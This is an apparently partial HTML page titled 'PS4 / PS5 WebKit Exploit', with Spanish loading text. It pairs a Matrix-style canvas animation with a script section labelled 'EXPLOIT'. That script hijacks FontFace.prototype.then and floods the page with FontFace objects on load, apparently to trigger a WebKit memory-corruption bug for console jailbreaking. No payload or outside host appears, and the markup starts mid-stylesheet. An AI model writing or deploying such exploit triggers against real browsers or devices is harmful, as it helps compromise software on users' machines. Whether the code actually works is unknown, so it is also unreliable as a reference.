    <style>

            margin: 0;

            height: 100vh;
        }
        canvas {
            position: absolute;

<body>

    <canvas id="matrix"></canvas>

    <div class="content">
        <h1>PS4 / PS5 WebKit Exploit</h1>

        <p style="margin-top: 40px; color:#00ff80;">Cargando exploit... No cierres la página</p>
    </div>

    <script>
        // === MATRIX BACKGROUND ===
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');

        canvas.height = window.innerHeight;
        canvas.width = window.innerWidth;

        const chars = '01アイウエオ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);

        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ff41';
            ctx.font = fontSize + 'px monospace';

            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);

                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        setInterval(draw, 35);

        // === EXPLOIT ===
        let triggered = false;

        Object.defineProperty(FontFace.prototype, 'then', {
            get() {
                if (!triggered) {
                    triggered = true;
                    for (let i = 0; i < 12; i++) {
                        new FontFace('x' + i, 'local(Arial)', { unicodeRange: 'U+0041-005A' });
                    }
                }
                return undefined;
            }
        });

        window.onload = () => {
            const ff = new FontFace('x', 'local(Arial)', { unicodeRange: 'U+0041-005A' });
            document.fonts.add(ff);
            document.fonts.load('1em x', 'ABC').catch(() => {});
        };
    </script>
